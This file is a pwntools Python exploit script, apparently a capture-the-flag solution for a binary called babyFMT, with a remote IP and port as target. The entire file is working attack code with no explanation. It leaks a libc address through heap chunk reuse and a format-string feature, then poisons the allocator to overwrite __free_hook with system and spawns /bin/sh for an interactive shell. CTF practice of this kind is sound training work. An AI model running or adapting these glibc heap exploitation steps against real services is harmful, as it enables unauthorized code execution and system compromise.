from pwn import *

elf = context.binary = ELF("./babyFMT")
libc = ELF("./libc-2.31.so")

if args.GDB:
	p = gdb.debug(elf.path, '\n'.join([
		# "b *main+58", # menu
		# "b *add+150", # malloc
		# "b *add+243", # second scanf 
		# "b *show",
		# "b *show+128",  # scanf format
		"b *show+165", # printing formatted string
		# "b *del",
		"c"
	]), env = {
		# 'LD_PRELOAD': './libc-2.31.so'
	})
elif args.REMOTE:
	p = remote("1.13.172.204", 9999)
else:
	p = process(elf.path) 

content_size = lambda x: p.sendline(b'Content size is ' + x)
book_author = lambda x: p.sendline(b'Book author is ' + x)
book_content = lambda x: p.sendline(b'Book content is ' + x)
book_idx = lambda x: p.sendline(b'Book idx is ' + x)

my_format = lambda x: p.sendline(b'My format ' + x)

# content cannot be longer than `size` bytes
# author max 0x10
def malloc(size, author=b'', content=b''):
	p.recvuntil(b'>')
	p.sendline(b'1')
	content_size(str(size).encode())
	book_author(author)
	book_content(content)

def free(idx):
	p.recvuntil(b'>')
	p.sendline(b'2')
	book_idx(str(idx).encode())

def show(idx, fmt=b'.%r.%m.%r.'):
	p.recvuntil(b'>')
	p.sendline(b'3')
	book_idx(str(idx).encode())
	my_format(fmt)
	p.recvuntil(b'You can show book by yourself\n')


for i in range(10):
	malloc(0xe0, b'A' * 16, str(i).encode() * 16)

for i in range(9, -1, -1):
    free(i)

for i in range(8):
	malloc(0xe0)

malloc(0xe0, b'', b'leakleak')
show(8)
leakline = p.recvline()
leakline = leakline.split(b'.', 1)[1]
leakline = leakline.split(b'.224.')[0]
leak_libc = u64(leakline.ljust(8, b'\x00'))
main_arena = leak_libc - 96
libc_base = main_arena - 0x1ebb80
print(f"libc_base: {hex(libc_base)}")
libc.address = libc_base
free_hook = libc.symbols['__free_hook']
print(f"free_hook: {hex(free_hook)}")
print(f"system: {hex(libc.symbols['system'])}")

free(8)
free(7)

show(0, b'%\x00' + b'a' * 0x18 + p64(0x1111111111111111) + p64(free_hook-0x18))

malloc(0xe0, b'', b'')
malloc(0xe0, b'', p64(libc.symbols['system']))
show(0, b'/bin/sh\x00')

p.interactive()
